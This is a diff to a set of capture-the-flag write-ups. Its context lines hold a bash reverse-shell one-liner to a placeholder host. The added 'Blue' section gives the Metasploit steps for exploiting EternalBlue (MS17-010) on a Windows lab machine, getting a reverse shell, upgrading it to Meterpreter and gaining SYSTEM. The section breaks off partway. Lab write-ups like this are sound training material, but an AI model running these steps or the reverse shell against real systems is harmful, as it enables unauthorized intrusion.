@@ -19,3 +19,19 @@ In this CTF we have to exploit a web server to find three flags.
 bash -c `bash -1 >& /dev/tcp/x.x.x.x/8080 0>&1`
 ```
 
+# Blue
+In this CTF we exploit a Windows machine, using common misconfigurations.
+1. We perform a Nmap scan and discover 8 open ports, including:
+	- 135: msrpc
+	- 139: netbios-ssn
+	- 445: microsoft-ds
+	- 3389: ms-wbt-server
+2. We scan the target for vulnerabilities:
+	- `auxiliary/scanner/smb/smb_ms17_010` reveals that the target is vuonerable to the `ms17_010` exploit
+3. We use the `exploit/windows/smb/ms17_010_eternalblue` exploit, set the payload to `windows/x64/shell/reverse_tcp`
+4. Once we have a reverse shell, we convert it to a *Meterpreter* shell:
+	1. Background the current session (CTRL+Z or type "background")
+	2. Use the `post/multi/manage/shell_to_meterpreter` module, set the parameter and run it
+	3. Switch to the new *Meterpreter* session with `sessions -i 2`
+5. We confirm that we run as "NT AUTHORITY/SYSTEM" by using the command `getsystem`
+6. We use `ps` to list all running processes, choose one that runs as "NT AUTOTITY/SYSTEM" and note its "PID"
